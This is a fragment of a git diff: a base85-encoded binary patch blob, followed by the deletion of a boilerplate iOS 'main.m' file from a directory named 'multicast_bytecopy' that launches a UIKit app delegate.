zj{txq0RR9Sj{txq0RR9Sj{txq0RR9Sj{txq0RR9Sj{txq0RR9Sj{txq0RR9Sj{tyl
z0ssITj{tx~0ssITj{txq0RR9Sj{txq0RR9Sj{txq0RR9Sj{txq0RR9Sj{txq0RR9S
zj{txq0RR9Sj{tyl0ssITj{tx~0ssITj{txq0RR9Sj{txq0RR9Sj{txq0RR9Sj{txq
z0RR9Sj{txq0RR9Sj{txq0RR9Sj{tyl0ssITj{tx~0ssITj{txq0RR9Sj{txq0RR9S
zj{txq0RR9Sj{txq0RR9Sj{txq0RR9Sj{txq0RR9Sj{tyl0ssITj{tx~0ssITj{txO
z0ssITj{txO0ssITj{txO0ssITj{txO0ssITj{txO0ssITj{txO0ssITj{txO0ssIT
zj{txO0ssITj{txO0ssITj{txO0ssITj{txO0ssITj{txO0ssITj{txO0ssITj{txO
z0ssITj{txO0ssITj{txO0ssITj{txO0ssITj{txO0ssITj{txO0ssITj{txO0ssIT
zj{txO0ssITj{txO0ssITj{txO0ssITj{txO0ssITj{txO0ssITj{txO0ssITj{txO
z0ssITj{txO0ssITj{txO0ssITj{txO0ssITj{txO0ssITj{txO0ssITj{txq0RR9S
zj{txq0RR9Sj{txq0RR9Sj{txq0RR9Sj{txq0RR9Sj{txq0RR9Sj{tyl0ssITj{tx~
z0ssITj{txq0RR9Sj{txq0RR9Sj{txq0RR9Sj{txq0RR9Sj{txq0RR9Sj{txq0RR9S
zj{tyl0ssITj{tx~0ssITj{txm0000Rj{txm0000Rj{txm0000Rj{txm0000Rj{txm
z0000Rj{txm0000Rj{txm0000Rj{txm0000Rj{txm0000Rj{txm0000Rj{txm0000R
zj{txm0000Rj{txm0000Rj{txm0000Rj{txm0000Rj{txm0000Rj{txK0{{RUj{tz|
z0ssITj{tz|0ssITj{tz|0ssITj{tz|0ssITj{tz|0ssITj{tz|0ssITj{tz|0ssIT
zj{tz|0ssITj{tz|0ssITj{tz|0ssITj{tz|0ssITj{tz|0ssITj{tz|0ssITj{tz|
z0ssITj{tz|0ssITj{tzg0ssITj{tz60ssITj{tz60ssITj{tz60ssITj{tz60ssIT
zj{tz60ssITj{tz60ssITj{tz60ssITj{tz60ssITj{tz60ssITj{tz60ssITj{tz6
z0ssITj{tz60ssITj{tz60ssITj{tz60ssITj{tz60ssITj{txG000000000e00000
z000C400000000000000000000000000002|0RR9G000C400000000000000000000
z000000002M00007000C4000000000000000000000000000008000000006200000
z000000000000000000000001p00007000C400000000000000000000000000002A
z0ssIX000C400000000000000000000000000002200007000C4000000000000000
z00000000000002M00007000C400000000000000000000000000001t00001000C4
z00000000000000000000000000001(00000000620000000000000000000000000
z000000{{RY000C400000000000000000000000000001B00001000C40000000000
z0000000000000000002U00001000C400000000000000000000000000002&00007
z0RRL500000000000000000000000000001t3IG5f000C400000000000000000000
z000000000O0RR94000C400000000000000000000000000000?4FCWi000C400000
z000000000000000000000000)2><{e000C400000000000000000000000000000m
z0ssI2000620000000000000000000000000000080000000062000000000000000
z00000000000002|0RR9W000C400000000000000000000000000000q1ONa400062
z00000000000000000000000000001R00000000620000000000000000000000000
z0002A000005C8%I00000000000000000000000000002I00001AOHdY0000000000
z0000000000000000000S0RR91000620000000000000000000C0000E001or0ssI9
z001rg0RR96001r60RR95001q>0RR96001qh0RR96001pK0RR9!001rU00003001rM
z0000u001qN0000F001q>0ssIy001q#0ssI2001qV0ssI!001q70ssIG001q30ssI2
z001pK0{{RE001o@0{{Rx001o@1^@s%001o%1^@sR002x71^@sR002D*1^@sz003+R
z1^@sz003Q}1poj!001pu1poj(001p81poj(001oz1poj$001q}1ONaF001py1ONa!
z001pq1ONa!001pa1ONa#001oj1ONaz001r20{{R#001q#0{{R#001qt0{{Rx001qx
z1^@s$001ql1^@s7001qF1^@s&001q71^@s7001py2LJ#%001pm2LJ#9001pG2LJ#(
z001p82LJ#9001q-2LJ#+001qx2LJ#U002z12LJ#U002E$3jhEH001pK3jhEH001r6
z3IG5G001pC2><{V002xd2><{V002D{3;+NK001rA3jhEK001q}3jhEJ001qJ3;+NL
z001q73;+NI001pa3;+NI001qR4FCWN001pu4FCWN001p84FCWN001pi7ytk@001rU
z6#xJj002zv6#xJj002GY6#xJr002zj6#xJr002E)6#xJo002x_6#xJo002Eu6#xJn
z002x(6#xJn002Ei6#xJp002xt6#xJp002Ea6#xJm002xl6#xJm002ES6#xJl002xd
z6#xJl002EK6#xJq002xV6#xJq002EC6#xJs002xN6#xJs002D{6#xJk002x76#xJk
z002Fp6aWA=003;96aWA=003P~5&!@p002x#5&!@p002D*5&!@Z001rU5dZ)Y001rA
z5dZ)Y001q>5dZ)Y001ov5dZ)q002w~5dZ)q002Gw5C8xo002z*5C8xo002GY5C8xa
z001q_5C8xa001qp5C8xa001qN5C8xa001qZ4*&ol002y!4*&ol002Ei4*&ok002xt
z4*&ok002D@4*&oj002x34*&oj002Go4gdf+001p84gdf+001ov4gdf)003+V4gdf)
z003R|4FCWw002zz4FCWw002D%82|u1001o*Apigq001ozApig=002x3Apig=002D*
zApig<002w`Apig<002GoAOHXp001rQAOHX-002zrAOHX-002GYAOHX+002zjAOHX+
z002GEAOHXp001q>AOHX*002zHAOHX*002F}AOHX)002z9AOHX)002F#AOHXo001p;
z9smF<002yE9smF<002D<9smF;002w~9smF;002GU9RL75001p49RL6j001o*8~^|~
z001rA8UO%2001rU82|t*002zv82|t*002GwF8}~F001q_F8}~G003;rF8}~G003QJ
zF8}~N001qtE&u=x001pCE&u=x001rAEdT%w001rICIA37003;@CIA37003R2GXMZR
z001p$GXMZR001rgG5`P!001p$GyniD002y6GyniD002Dz0000q006%D2LJ#N006%5
z2LJ#N006$|2LJ#N006$=2LJ#N006$&2LJ#N006$w2LJ#N006$o2LJ#N006$g2LJ#N
z006$Y2LJ#N006$Q2LJ#N006$I2LJ#N006$A2LJ#N006$22LJ#N006#_2LJ#N006#-
z2LJ#N006##2LJ#N006#t2LJ#N006#l2LJ#N006#d2LJ#N006#V2LJ#N006#N2LJ#N
z006#F2LJ#N006#72LJ#N006!~2LJ#N006!?2LJ#N006!)2LJ#N006!y2LJ#N006!q
z2LJ#N006!i2LJ#N006!a2LJ#N006!S2LJ#N006!K2LJ#N006%D1^@sM006%51^@sM
z006$|1^@sM006$=1^@sM006$&1^@sM006$w1^@sM006$o1^@sM006$g1^@sM006$Y
z1^@sM006$Q1^@sM006$I1^@sM006$A1^@sM006$21^@sM006#_1^@sM006#-1^@sM
z006##1^@sM006#t1^@sM006#l1^@sM006#d1^@sM006#V1^@sM006#N1^@sM006#F
z1^@sM006#71^@sM006!~1^@sM006!?1^@sM006!)1^@sM006!y1^@sM006!q1^@sM
z006!i1^@sM006!a1^@sM006!S1^@sM006!K1^@sM006%D1pojL006%51pojL006$|
z1pojL006$=1pojL006$&1pojL006$w1pojL006$o1pojL006$g1pojL006$Y1pojL
z006$Q1pojL006$I1pojL006$A1pojL006$21pojL006#_1pojL006#-1pojL006##
z1pojL006#t1pojL006#l1pojL006#d1pojL006#V1pojL006#N1pojL006#F1pojL
z006#71pojL006!~1pojL006!?1pojL006!)1pojL006!y1pojL006!q1pojL006!i
z1pojL006!a1pojL006!S1pojL006!K1pojL006%D1ONaK006%51ONaK006$|1ONaK
z006$=1ONaK006$&1ONaK006$w1ONaK006$o1ONaK006$g1ONaK006$Y1ONaK006$Q
z1ONaK006$I1ONaK006$A1ONaK006$21ONaK006#_1ONaK006#-1ONaK006##1ONaK
z006#t1ONaK006#l1ONaK006#d1ONaK006#V1ONaK006#N1ONaK006#F1ONaK006#7
z1ONaK006!~1ONaK006!?1ONaK006!)1ONaK006!y1ONaK006!q1ONaK006!i1ONaK
z006!a1ONaK006!S1ONaK006!K1ONaK006%D0{{RJ006%50{{RJ006$|0{{RJ006$=
z0{{RJ006$&0{{RJ006$w0{{RJ006$o0{{RJ006$g0{{RJ006$Y0{{RJ006$Q0{{RJ
z006$I0{{RJ006$A0{{RJ006$20{{RJ006#_0{{RJ006#-0{{RJ006##0{{RJ006#t
z0{{RJ006#l0{{RJ006#d0{{RJ006#V0{{RJ006#N0{{RJ006#F0{{RJ006#70{{RJ
z006!~0{{RJ006!?0{{RJ006!)0{{RJ006!y0{{RJ006!q0{{RJ006!i0{{RJ006!a
z0{{RJ006!S0{{RJ006!K0{{RJ006%D0ssII006%50ssII006$|0ssII006$=0ssII
z006$&0ssII006$w0ssII006$o0ssII006$g0ssII006$Y0ssII006$Q0ssII006$I
z0ssII006$A0ssII006$20ssII006#_0ssII006#-0ssII006##0ssII006#t0ssII
z006#l0ssII006#d0ssII006#V0ssII006#N0ssII006#F0ssII006#70ssII006!~
z0ssII006!?0ssII006!)0ssII006!y0ssII006!q0ssII006!i0ssII006!a0ssII
z006!S0ssII006!K0ssII006%D0RR9H006%50RR9H006$|0RR9H006$=0RR9H006$&
z0RR9H006$w0RR9H006$o0RR9H006$g0RR9H006$Y0RR9H006$Q0RR9H006$I0RR9H
z006$A0RR9H006$20RR9H006#_0RR9H006#-0RR9H006##0RR9H006#t0RR9H006#l
z0RR9H006#d0RR9H006#V0RR9H006#N0RR9H006#F0RR9H006#70RR9H006!~0RR9H
z006!?0RR9H006!)0RR9H006!y0RR9H006!q0RR9H006!i0RR9H006!a0RR9H006!S
z0RR9H006!K0RR9H006%D0000G006%50000G006$|0000G006$=0000G006$&0000G
z006$w0000G006$o0000G006$g0000G006$Y0000G006$Q0000G006$I0000G006$A
z0000G006$20000G006#_0000G006#-0000G006##0000G006#t0000G006#l0000G
z006#d0000G006#V0000G006#N0000G006#F0000G006#70000G006!~0000G006!?
z0000G006!)0000G006!y0000G006!q0000G006!i0000G006!a0000G006!S0000G
z006!K0000G006!K0000p000gk00000000g^0000o000hP0000n000hv00001000i4
z00002000ia0000l000i)0000m000gE0RR94000gk0RR95000g^0RR96000hP0RR97
z000hv0RR98000i40RR99000ia0RR9A000i)0RR9B000gE0ssID000gk0ssIE000g^
z0ssIF000hP0ssIG000hv0ssIH000i40ssII000ia0ssIJ000i)0ssIK000gE0{{RM
z000gk0{{RN000gL0+0-p3<Lv&42TSj3<m<V54aBk0<aRa5(EQ?9E=>090CIH8}u6o
z0*oGz9tQ%z9>g980-PV99|r=6B8(yj0{9{PAqN7;B+MiP1Dq+KDWoX}0@y0tDhC40
zD$pti0>CQ7DhC3%D!eKO0<bEyDhC3nDy%980-!3SDhC3PDwHY*0_-dBD+dDLE95H&
z0_-#JGY0~QJd8XC0_;5SJO=`dLXbiS0)#?{LI(oqLF_>X0^mX9K?efFLC8S|0=z-M
zK?DQfP2^4JO#}nTU(8?7Uk3u@Xy|AF0002}0000U0RR9f000000000V0RR9V0RRB(
z0ssI20000%0RR9V0RRAW0{{R30001C0RR9V0RRA$2LJ#70001V0RR9V0RR9X2mk;8
z0001t0RR9V0RRBF2mk;80001=0RR9F0RRBF3jhEB0002A0RR9V0RR9P3;+NC0002V
z0RR9F0RRBt3;+NC0002n0RR9F0RRBZ4FCWD0002-0RR9F0RRA47ytkO000010ssIW
z0RRAS82|tP0000F0ssIW0RRBJCIA2c0000S0ssIG0RR91FaQ7m0000j0ssIW0RR9n
zG5`Po0000-0ssIW0RR9vG5`Po000160ssIW0RR9rGynhq0001J0ssIW0RRAKH~;_u
z0001h0ssIW0RRBlH~;_u0001(0ssIW0RRAuIRF3v0002C0ssIW0RR9<IsgCw0002W
z0ssIW0ssJHI{*Lx0002a0ssIW0{{T9I{*Lx0002f0ssIW0{{TPI{*Lx0002k0ssIG
z1ONcgI{*Lx0002y0ssIG1ONaKJOBUy0002=0ssIG1ONaKJpcdz000020{{RH1ONae
zJpcdz0000G0{{RH1ONbZJpcdz0000U0{{RH1ONbtJpcdz0000i0{{RH1ONcoJpcdz
z0000(0{{RH1ONaOKL7v#000150{{RH1ONa`NB{r;0001S0{{RH1ONa~NdN!<0001p
z0{{RH1ONb7O8@`>000220{{RH1ONbdO8@`>0000G0{{RH1ONb-O8@`>0000U0{{RH
z1ONc6O8@`>0002=0ssIG1ONd1O8@`>000020{{RH1ONaKOaK4?0002k0ssIG1ONbF
zOaK4?0002y0ssIG1ONb_OaK4?0002e0{{RH1ONb_O#lD@000051ONaI1ONcQO#lD@
z0001S0{{RH1ONcwO#lD@0000u1ONaI1pol(PXGV_000131ONaI1^@u?PXGV_00002
z0000F0RR9f1^@s60000N0000F0RRBh1^@s60000g0000F0RRBx0ssI20000*0000F
z0RR9b0ssI2000150000F0RR91000000001W0000100000000000001n0000100000
z000000001(000010000000000000210000100000000000002C000010000000000
z0002J0000100000000000002Q0000100000000000002W0000100000000000002e
z0000100000000000002m0000100000000000002u0000100000000000002%00001
z00000000000000W0AFl+W^-j<WMyM-WMyAsb!KK|asXd!dS-KFUu0!tZ)9a(W@&6?
z0AFl+W^-j<WMyM-WMyA-V{&11V`yJ<X?kS<Uu=42b7fy;Zewp`WnW@-W@cq_0AFl+
zW^-j<Wo~0{WMyA-V{&11V`yJ<X?kS<UteEiXlrwHYhPqxa(8KN0AF8Ub97;2YhPn%
zYhPwzX>0&rUte={VPk7wV`yt%XLVt6WB^}ZUvqS1WpZ+G0AFHyWpZx-UuJS;VPpVb
zW^!d^0AFTza%psB0AFokY;1310AFooZDVkG0AFooZEbIMWdL7oWo>h1bYE~`baZ8M
zZZS3hUu=42b7fy;Zewp`WnW@-W@cq_Uw3JAXkT+<a$$61XaHYqdS-KFUu0!tZ)9a(
zVs&O_WpZD4X>@2`b7OL0bYo}$Uu=42b7fy-Wn*t-WnX4#Y-L|}X>@2`b7OL0bYo}$
zUu=42b7fy;Zewp`WnXD-X><TzY<gyMWnX1(V{c?-UvzR|ZgXs5bY%cvY<gyMWnX1(
zV{c?-Ut(c%WdL7ndS-KFUt(cnYh`X^Uu|J@V`u<hY<gyMWnX1(V{c?-UuJ1;X>(`*
zUu=42b7fy}b#rK6ZDDj{XaHYqdS-KFUuAA%Z)9a(ZDDj{Xk~K%Uu=42b7fy}b#rK6
zY;9x!Uu=42b7fy-Wn*t-WdL7ndUkGKWo~0{WMu$fY<hNXUuA7+bYE>@bYo}$Uu=4I
zZeL|?V{c?-Uvpz}VRU0?Uvp`CWdL7ndUkGKWo~0{WMyAsb!KK|asXd!dUkGKWMyM-
zWMu$fW^-j<X>MtBUuAA%Z)9b1Uvyz&Y-IpnW^-j<X>MtBUu0!tZ)9b1Uvyz&Y-Ipn
zW^-j<X>MtBUv^<^b!A^<Wn*t-WpZD1VPb4$0AFTvWnXS@a&2L3X?kT}W^!e508B$M
z0BkTYG5~BaFf#yOWM5@?baG)|Vrg`90AFNZVqtS-Uv^<^b!7lwZC_=0baG)|Vrg`9
z0AFoiVqtS-Uv^<^b!7lwY+q$~baG)|Vrg`90AFlhVqtS-Uv^<^b!7lwY+qtwb7fy<
za&K*4c42IFWiE4hZ2(_wUt(c%WnX4;Z*5<8VQh6}E^~Qp0AFNZVqtS-UuJS|ZC`d_
zY;|QWb9rq5UuJV<Uu|J?YhP@0Vm34`ZFFH`Y-Ip!Uvqb9bYo~PbYWs_WiD)bW^-j<
zWo~0{WMyA%VRU0?Wpe;*Uvqb9bYo~PbYWs_WiD)bW^-j<Wo~0{WMyA%VRU0?Wpgeu
z0AFl+W^-j<WMyM-WMyA=F<)kKWpQ72VQh6}E^K;cb7fy<a%FK}ZenS4b6<2}Vr*pq
zUu=42b7fy-Wn*t-WnXqNUuJS;abI>}Y;|QWY<gyMWnX4;WpQ72VQh6}Uvyz&Y-Ip!
zUteEiXlrwHYhPqxa(8KNBw=-QXkT!2awKVCBrpJ9Y<hNXUu0!tZ)9aIZ*XH@bYg4(
G0001^<EZ!m

diff --git a/multicast_bytecopy/main.m b/multicast_bytecopy/main.m
deleted file mode 100644
index dba295e..0000000
--- a/multicast_bytecopy/main.m
+++ /dev/null
@@ -1,11 +0,0 @@
-#import <UIKit/UIKit.h>
-#import "AppDelegate.h"
-
-int main(int argc, char * argv[]) {
-    NSString * appDelegateClassName;
-    @autoreleasepool {
-        // Setup code that might create autoreleased objects goes here.
-        appDelegateClassName = NSStringFromClass([AppDelegate class]);
-    }
-    return UIApplicationMain(argc, argv, nil, appDelegateClassName);
-}
